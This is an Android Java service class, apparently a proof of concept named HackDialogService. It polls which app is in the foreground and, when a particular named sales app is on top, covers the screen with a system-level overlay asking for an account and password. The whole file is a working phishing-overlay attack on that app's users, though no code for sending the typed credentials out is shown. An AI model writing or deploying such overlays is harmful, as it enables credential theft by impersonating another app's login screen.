package com.example.wangweimin.customerview.service;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.nfc.cardemulation.HostApduService;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.text.method.HideReturnsTransformationMethod;
import android.text.method.PasswordTransformationMethod;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;

import com.example.wangweimin.customerview.R;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;

/**
 * Created by wangweimin on 16/12/6.
 */

public class HackDialogService extends Service {
    private WindowManager windowManager;
    private View v;
    private boolean isRunning = true;
    private Handler myHandler;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        myHandler = new MyHandler();

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    Log.e(HackDialogService.class.getSimpleName(), "isRunning");
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (isAppForeground("com.tqmall.salestool"))
                        myHandler.sendEmptyMessage(1);
                }
            }
        }).start();
    }

    private boolean isAppForeground(String appName) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP)
            return appName.equals(getTopActivityBeforeL());
        else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
            return appName.equals(getTopActivityAfterLM());
        else
            return appName.equals(getTopActivityBeforeLMAfterL());

        // TODO: 16/12/12 can use terminal tool to get running process
    }

    private String getTopActivityBeforeL() {
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> taskInfo = activityManager.getRunningAppProcesses();
        return taskInfo.get(0).processName;
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    private String getTopActivityAfterLM() {
        try {
            UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long millisecond = 60 * 1000;
            long date = System.currentTimeMillis();
            List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, date - millisecond, date);
            if (queryUsageStats.size() <= 0)
                return null;

            long recentTime = 0;
            String recentPkg = "";
            for (int i = 0; i < queryUsageStats.size(); i++) {
                UsageStats usageStats = queryUsageStats.get(i);
                if (usageStats.getLastTimeStamp() > recentTime) {
                    recentTime = usageStats.getLastTimeStamp();
                    recentPkg = usageStats.getPackageName();
                }
            }
            return recentPkg;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    // 16/12/12 only get the running service
    private String getRunningAppProcess(){
        Hashtable<String, List<ActivityManager.RunningServiceInfo>> hashtable = new Hashtable<>();
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for(ActivityManager.RunningServiceInfo rsi : manager.getRunningServices(Integer.MAX_VALUE)){
            String pkgName = rsi.service.getPackageName();
            if(hashtable.get(pkgName) == null){
                List<ActivityManager.RunningServiceInfo> list = new ArrayList<>();
                list.add(rsi);
                hashtable.put(pkgName, list);
            }else
                hashtable.get(pkgName).add(rsi);
        }
        int i = 0;
        for(Iterator it = hashtable.keySet().iterator(); it.hasNext(); i++){
            String key = (String) it.next();
            List<ActivityManager.RunningServiceInfo> value = hashtable.get(key);
            if(value.get(0).foreground)
                return value.get(0).process;
        }
        return null;
    }

    private String getTopActivityBeforeLMAfterL() {
        final int PROCESS_STATE_TOP = 2;
        Field field = null;
        ActivityManager.RunningAppProcessInfo currentInfo = null;
        try {
            field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }

        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> taskInfo = activityManager.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo processInfo : taskInfo) {
            if (processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
                    && processInfo.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN) {
                Integer state = null;
                try {
                    state = field.getInt(processInfo);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                if (state != null && state == PROCESS_STATE_TOP) {
                    currentInfo = processInfo;
                    break;
                }
            }
        }
        return currentInfo != null ? currentInfo.processName : null;
    }

    private void showDialog() {
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams();
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = WindowManager.LayoutParams.MATCH_PARENT;
        params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
        params.format = PixelFormat.TRANSPARENT;
        params.gravity = Gravity.CENTER;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;

        LayoutInflater inflater = LayoutInflater.from(this);
        v = inflater.inflate(R.layout.window, null);

        EditText etAccount = (EditText) v.findViewById(R.id.et_account);
        final EditText etPwd = (EditText) v.findViewById(R.id.et_pwd);
        CheckBox showPwd = (CheckBox) v.findViewById(R.id.show_pwd);

        showPwd.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked)
                    etPwd.setTransformationMethod(HideReturnsTransformationMethod.getInstance());
                else etPwd.setTransformationMethod(PasswordTransformationMethod.getInstance());

                etPwd.setSelection(TextUtils.isEmpty(etPwd.getText()) ? 0 : etPwd.getText().length());
            }
        });

        v.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent event) {
                Rect temp = new Rect();
                view.getGlobalVisibleRect(temp);
                if (temp.contains((int) (event.getX()), (int) (event.getY()))) {
                    windowManager.removeViewImmediate(v);
                    return true;
                }
                return false;
            }
        });

        windowManager.addView(v, params);
    }

    private class MyHandler extends Handler {
        @Override
        public void handleMessage(Message msg) {
            if (v == null || !v.isAttachedToWindow())
                showDialog();
        }
    }
}
